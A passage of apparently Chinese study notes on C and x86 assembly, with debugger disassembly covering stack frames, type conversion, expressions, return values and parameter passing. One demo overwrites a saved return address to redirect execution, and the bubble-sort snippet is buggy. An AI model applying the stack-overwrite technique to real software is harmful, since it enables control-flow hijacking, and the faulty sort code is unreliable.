class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004010C0 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">004010C1  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">004010C3  |.  83EC 54       sub     esp,0x54</span><br><span class=\"line\">004010C6  |.  53            push    ebx</span><br><span class=\"line\">004010C7  |.  56            push    esi</span><br><span class=\"line\">004010C8  |.  57            push    edi</span><br><span class=\"line\">004010C9  |.  8D7D AC       lea     edi,[local.21]</span><br><span class=\"line\">004010CC  |.  B9 15000000   mov     ecx,0x15</span><br><span class=\"line\">004010D1  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">004010D6  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">004010D8  |.  C745 EC 01000&gt;mov     dword ptr ss:[ebp-0x14],0x1</span><br><span class=\"line\">004010DF  |.  C745 F0 02000&gt;mov     [local.4],0x2</span><br><span class=\"line\">004010E6  |.  C745 F4 03000&gt;mov     [local.3],0x3</span><br><span class=\"line\">004010ED  |.  C745 F8 04000&gt;mov     [local.2],0x4</span><br><span class=\"line\">004010F4  |.  C745 FC 05000&gt;mov     dword ptr ss:[ebp-0x4],0x5</span><br><span class=\"line\">004010FB  |.  C745 04 05104&gt;mov     dword ptr ss:[ebp+0x4],00401005</span><br><span class=\"line\">00401102  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00401104  |.  5F            pop     edi</span><br><span class=\"line\">00401105  |.  5E            pop     esi</span><br><span class=\"line\">00401106  |.  5B            pop     ebx</span><br><span class=\"line\">00401107  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00401109  |.  5D            pop     ebp</span><br><span class=\"line\">0040110A  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">0018FF28   CCCCCCCC</span><br><span class=\"line\">0018FF2C   CCCCCCCC</span><br><span class=\"line\">0018FF30   CCCCCCCC</span><br><span class=\"line\">0018FF34   CCCCCCCC</span><br><span class=\"line\">0018FF38   CCCCCCCC</span><br><span class=\"line\">0018FF3C   CCCCCCCC</span><br><span class=\"line\">0018FF40   CCCCCCCC</span><br><span class=\"line\">0018FF44   CCCCCCCC</span><br><span class=\"line\">0018FF48  /0018FF88  ebp</span><br><span class=\"line\">0018FF4C  |004015F9  返回到 88888.&lt;ModuleEntryPoint&gt;+0E9 来自 88888.0040100A</span><br><span class=\"line\"></span><br><span class=\"line\">0018FF28   CCCCCCCC</span><br><span class=\"line\">0018FF2C   CCCCCCCC</span><br><span class=\"line\">0018FF30   CCCCCCCC</span><br><span class=\"line\">0018FF34   00000001</span><br><span class=\"line\">0018FF38   00000002</span><br><span class=\"line\">0018FF3C   00000003</span><br><span class=\"line\">0018FF40   00000004</span><br><span class=\"line\">0018FF44   00000005</span><br><span class=\"line\">0018FF48   0018FF88  ebp</span><br><span class=\"line\">0018FF4C   00401005  88888.00401005</span><br><span class=\"line\"></span><br><span class=\"line\">00401005   . /E9 16000000   jmp     HelloWorld</span><br><span class=\"line\">0040100A   $ |E9 B1000000   jmp     main</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &quot;stdafx.h&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">void Func()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i;</span><br><span class=\"line\">\tint arr[5] = &#123;0&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tfor(i=0;i&lt;=5;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tarr[i]=0;</span><br><span class=\"line\">\t\tprintf(&quot;hello world&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tFunc();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">004010C0 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">004010C1  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">004010C3  |.  83EC 40       sub     esp,0x40</span><br><span class=\"line\">004010C6  |.  53            push    ebx</span><br><span class=\"line\">004010C7  |.  56            push    esi</span><br><span class=\"line\">004010C8  |.  57            push    edi</span><br><span class=\"line\">004010C9  |.  8D7D C0       lea     edi,[local.16]</span><br><span class=\"line\">004010CC  |.  B9 10000000   mov     ecx,0x10</span><br><span class=\"line\">004010D1  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">004010D6  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">004010D8  |.  E8 32FFFFFF   call    0040100F</span><br><span class=\"line\">004010DD  |.  33C0          xor     eax,eax</span><br><span class=\"line\">004010DF  |.  5F            pop     edi</span><br><span class=\"line\">004010E0  |.  5E            pop     esi</span><br><span class=\"line\">004010E1  |.  5B            pop     ebx</span><br><span class=\"line\">004010E2  |.  83C4 40       add     esp,0x40</span><br><span class=\"line\">004010E5  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">004010E7  |.  E8 E4030000   call    _chkesp</span><br><span class=\"line\">004010EC  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">004010EE  |.  5D            pop     ebp</span><br><span class=\"line\">004010EF  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">00401005   . /E9 16000000   jmp     Func</span><br><span class=\"line\">0040100A   $ |E9 B1000000   jmp     main</span><br><span class=\"line\">0040100F  /$ |E9 0C000000   jmp     Func</span><br><span class=\"line\"></span><br><span class=\"line\">00401020 &gt;|&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 58       sub     esp,0x58</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br><span class=\"line\">00401029  |.  8D7D A8       lea     edi,[local.22]</span><br><span class=\"line\">0040102C  |.  B9 16000000   mov     ecx,0x16</span><br><span class=\"line\">00401031  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401036  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401038  |.  C745 E8 00000&gt;mov     [local.6],0x0</span><br><span class=\"line\">0040103F  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00401041  |.  8945 EC       mov     [local.5],eax</span><br><span class=\"line\">00401044  |.  8945 F0       mov     [local.4],eax</span><br><span class=\"line\">00401047  |.  8945 F4       mov     [local.3],eax</span><br><span class=\"line\">0040104A  |.  8945 F8       mov     [local.2],eax</span><br><span class=\"line\">0040104D  |.  C745 FC 00000&gt;mov     [local.1],0x0</span><br><span class=\"line\">00401054  |.  EB 09         jmp     short 0040105F</span><br><span class=\"line\">00401056  |&gt;  8B4D FC       /mov     ecx,[local.1]</span><br><span class=\"line\">00401059  |.  83C1 01       |add     ecx,0x1</span><br><span class=\"line\">0040105C  |.  894D FC       |mov     [local.1],ecx</span><br><span class=\"line\">0040105F  |&gt;  837D FC 05     cmp     [local.1],0x5</span><br><span class=\"line\">00401063  |.  7F 1A         |jg      short 0040107F</span><br><span class=\"line\">00401065  |.  8B55 FC       |mov     edx,[local.1]</span><br><span class=\"line\">00401068  |.  C74495 E8 000&gt;|mov     dword ptr ss:[ebp+edx*4-0x18],0&gt;</span><br><span class=\"line\">00401070  |.  68 1C304200   |push    0042301C                        ; /format = &quot;hello world&quot;</span><br><span class=\"line\">00401075  |.  E8 D6030000   |call    printf                          ; \\printf</span><br><span class=\"line\">0040107A  |.  83C4 04       |add     esp,0x4</span><br><span class=\"line\">0040107D  |.^ EB D7         \\jmp     short 00401056</span><br><span class=\"line\">0040107F  |&gt;  5F            pop     edi</span><br><span class=\"line\">00401080  |.  5E            pop     esi</span><br><span class=\"line\">00401081  |.  5B            pop     ebx</span><br><span class=\"line\">00401082  |.  83C4 58       add     esp,0x58</span><br><span class=\"line\">00401085  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">00401087  |.  E8 44040000   call    _chkesp</span><br><span class=\"line\">0040108C  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040108E  |.  5D            pop     ebp</span><br><span class=\"line\">0040108F  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\">mov     dword ptr ss:[ebp+edx*4-0x18],0 在最后一次循环将ebp-4 = i变为了0，循环条件永远满足</span><br></pre></td></tr></table></figure>\n<p>总结:</p>\n<p>声明变量就是告诉计算机，我要用一块内存，你给我留着，宽度和存储格式有数据类型决定.</p>\n<p>计算机什么时候把这块内存给你，取决于变量的作用范围，如果是全局变量，在程序编译完就已经分配了空间，如果是局所在的程序被调用的时候，才会分配空间.</p>\n<p>全局变量如果不赋初始值，默认是 0，但局部变量在使用前一定要赋初值.</p>\n<p>类型转换</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">movsx   ;先符号扩展再传送</span><br><span class=\"line\">mov al,0x0FF     </span><br><span class=\"line\">movsx cx,al      11111111 11111111 </span><br><span class=\"line\">movsx al,80</span><br><span class=\"line\">movsx cx,al</span><br><span class=\"line\"></span><br><span class=\"line\">movzx</span><br><span class=\"line\">mov al,0x0ff</span><br><span class=\"line\">movzx cx,al</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int -&gt; short 转换时高位丢失，即从低位开始截取</span><br><span class=\"line\">int a = 0x12345678;</span><br><span class=\"line\">short b = a;     b = 5678</span><br></pre></td></tr></table></figure>\n<p>表达式</p>\n<p>特点一:</p>\n<p>表达式无论多么复杂，都只有一个结果</p>\n<p>特点二:</p>\n<p>只有表达式，可以编译通过，但并不生成代码，需要与赋值或者其他流程控制语句一起组合的时候才有意义</p>\n<p>特点三:</p>\n<p>当表达式中存在不同宽度的变量时，结果将转换为宽度最大的那个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char a = 10;</span><br><span class=\"line\">int b = 20;</span><br><span class=\"line\">printf(&quot;%d&quot;,a+b);   ;a+b为int类型</span><br></pre></td></tr></table></figure>\n<p>特点四:</p>\n<p>当表达式中同时存在有符号和无符号数的时候，表达式的结构将转换为无符号数.</p>\n<p>输出无符号或有符号根据输出的格式 % d 或 % u 决定</p>\n<p>int x = a == b;    ;sete  setne</p>\n<p>sete cmp 相等时 set 寄存器为 1</p>\n<p>if(a) == if(a != 0)</p>\n<p>if(!a) == if(a == 0)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (x&gt;1 &amp;&amp; x&gt;2 &amp;&amp; x&gt;3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;sb&quot;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">if (x&gt;1 || x&gt;2 || x&gt;3)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tprintf(&quot;sb&quot;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00401020 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 44       sub     esp,0x44</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br><span class=\"line\">00401029  |.  8D7D BC       lea     edi,[local.17]</span><br><span class=\"line\">0040102C  |.  B9 11000000   mov     ecx,0x11</span><br><span class=\"line\">00401031  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401036  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401038  |.  C745 FC 05000&gt;mov     [local.1],0x5</span><br><span class=\"line\">0040103F  |.  837D FC 01    cmp     [local.1],0x1</span><br><span class=\"line\">00401043  |.  7E 19         jle     short 0040105E</span><br><span class=\"line\">00401045  |.  837D FC 02    cmp     [local.1],0x2</span><br><span class=\"line\">00401049  |.  7E 13         jle     short 0040105E</span><br><span class=\"line\">0040104B  |.  837D FC 03    cmp     [local.1],0x3</span><br><span class=\"line\">0040104F  |.  7E 0D         jle     short 0040105E</span><br><span class=\"line\">00401051  |.  68 1C304200   push    0042301C                         ; /format = &quot;sb&quot;</span><br><span class=\"line\">00401056  |.  E8 F5030000   call    printf                           ; \\printf</span><br><span class=\"line\">0040105B  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">0040105E  |&gt;  837D FC 01    cmp     [local.1],0x1</span><br><span class=\"line\">00401062  |.  7F 0C         jg      short 00401070</span><br><span class=\"line\">00401064  |.  837D FC 02    cmp     [local.1],0x2</span><br><span class=\"line\">00401068  |.  7F 06         jg      short 00401070</span><br><span class=\"line\">0040106A  |.  837D FC 03    cmp     [local.1],0x3</span><br><span class=\"line\">0040106E  |.  7E 0D         jle     short 0040107D</span><br><span class=\"line\">00401070  |&gt;  68 1C304200   push    0042301C                         ; /format = &quot;sb&quot;</span><br><span class=\"line\">00401075  |.  E8 D6030000   call    printf                           ; \\printf</span><br><span class=\"line\">0040107A  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">0040107D  |&gt;  33C0          xor     eax,eax</span><br><span class=\"line\">0040107F  |.  5F            pop     edi</span><br><span class=\"line\">00401080  |.  5E            pop     esi</span><br><span class=\"line\">00401081  |.  5B            pop     ebx</span><br><span class=\"line\">00401082  |.  83C4 44       add     esp,0x44</span><br><span class=\"line\">00401085  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">00401087  |.  E8 44040000   call    _chkesp</span><br><span class=\"line\">0040108C  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040108E  |.  5D            pop     ebp</span><br><span class=\"line\">0040108F  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>C 语言没有 bool，C++ 才有</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if (x = 0)   //不执行</span><br><span class=\"line\">if (x = 2)   //执行</span><br><span class=\"line\">int a = 3;</span><br><span class=\"line\">if (a == 3)  //执行</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、将两个变量的值交换.</span><br><span class=\"line\">2、将一个数组中的数倒序输出.</span><br><span class=\"line\">3、找出数组里面最大的值，并返回</span><br><span class=\"line\">4、将数组所有的元素相加，将结果返回</span><br><span class=\"line\">5、将两个等长数组相同位置的值相加，存储到另外一个等长的数组中</span><br><span class=\"line\">6、写一个函数int prime(int x)，如果x是素数返回值为1，否则返回0。</span><br><span class=\"line\">7、俩俩比较数组的值，将最大的一个存储到数组的最后一个位置</span><br><span class=\"line\">8、编写程序实现一个冒泡排序的算法.</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"循环语句\"><a class=\"markdownIt-Anchor\" href=\"#循环语句\">#</a> 循环语句</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">do...while   性能最高的循环</span><br><span class=\"line\">while </span><br><span class=\"line\">for</span><br><span class=\"line\"></span><br><span class=\"line\">int length = 10</span><br><span class=\"line\">int m = 0</span><br><span class=\"line\">int arr[10] = &#123;   &#125;</span><br><span class=\"line\">while (m &lt; length - 1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfor (int i = 1; i &lt; length-1-m;i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tswap(arr[i],arr[i+1]);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tm++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>返回值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果返回值只有8位，使用al返回</span><br><span class=\"line\">ax</span><br><span class=\"line\">eax</span><br><span class=\"line\"></span><br><span class=\"line\">long long 在vc6中对应的是__int64</span><br><span class=\"line\"></span><br><span class=\"line\">__int64 Function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__int64 x = 0x1234567890;</span><br><span class=\"line\">\treturn x;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">00401020 &gt;/&gt; \\55                    push    ebp</span><br><span class=\"line\">00401021  |.  8BEC                  mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 48               sub     esp,0x48</span><br><span class=\"line\">00401026  |.  53                    push    ebx</span><br><span class=\"line\">00401027  |.  56                    push    esi</span><br><span class=\"line\">00401028  |.  57                    push    edi</span><br><span class=\"line\">00401029  |.  8D7D B8               lea     edi,[local.18]</span><br><span class=\"line\">0040102C  |.  B9 12000000           mov     ecx,0x12</span><br><span class=\"line\">00401031  |.  B8 CCCCCCCC           mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401036  |.  F3:AB                 rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401038  |.  C745 F8 90785634      mov     [local.2],0x34567890</span><br><span class=\"line\">0040103F  |.  C745 FC 12000000      mov     [local.1],0x12</span><br><span class=\"line\">00401046  |.  8B45 F8               mov     eax,[local.2]</span><br><span class=\"line\">00401049  |.  8B55 FC               mov     edx,[local.1]</span><br><span class=\"line\">0040104C  |.  5F                    pop     edi</span><br><span class=\"line\">0040104D  |.  5E                    pop     esi</span><br><span class=\"line\">0040104E  |.  5B                    pop     ebx</span><br><span class=\"line\">0040104F  |.  8BE5                  mov     esp,ebp</span><br><span class=\"line\">00401051  |.  5D                    pop     ebp</span><br><span class=\"line\">00401052  \\.  C3                    retn</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>参数传递</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void func(char a,char b,char c)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar a = 1,b=2,c=3;</span><br><span class=\"line\">\tfunc(a,b,c);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">0040D758  |.  C645 FC 01    mov     byte ptr ss:[ebp-0x4],0x1</span><br><span class=\"line\">0040D75C  |.  C645 F8 02    mov     byte ptr ss:[ebp-0x8],0x2</span><br><span class=\"line\">0040D760  |.  C645 F4 03    mov     byte ptr ss:[ebp-0xC],0x3</span><br><span class=\"line\">0040D764  |.  8A45 F4       mov     al,byte ptr ss:[ebp-0xC]</span><br><span class=\"line\">0040D767  |.  50            push    eax</span><br><span class=\"line\">0040D768  |.  8A4D F8       mov     cl,byte ptr ss:[ebp-0x8]</span><br><span class=\"line\">0040D76B  |.  51            push    ecx</span><br><span class=\"line\">0040D76C  |.  8A55 FC       mov     dl,byte ptr ss:[ebp-0x4]</span><br><span class=\"line\">0040D76F  |.  52            push    edx</span><br><span class=\"line\">0040D770  |.  E8 9A38FFFF   call    0040100F</span><br><span class=\"line\">0040D775  |.  83C4 0C       add     esp,0xC</span><br><span class=\"line\"></span><br><span class=\"line\">虽然定义的是char，但在压栈的时候还是会按照四字节的压，所以没法节约空间</span><br><span class=\"line\"></span><br><span class=\"line\">本机尺寸：本机32位，那么对32位的数据支持最好</span><br><span class=\"line\"></span><br><span class=\"line\">编译器遵守这个规则</span><br><span class=\"line\"></span><br><span class=\"line\">传输数据按照本机尺寸传，用还是按照原来大小用</span><br><span class=\"line\"></span><br><span class=\"line\">传参的时候如果是&lt;int的整数，一律使用int类型 </span><br><span class=\"line\"></span><br><span class=\"line\">参数传递的本质:将上层函数的变量，或者表达式的值“复制一份”，传递给下层函数.  可以理解为[ebp-4] 和 [ebp+8]的区别</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>局部变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td 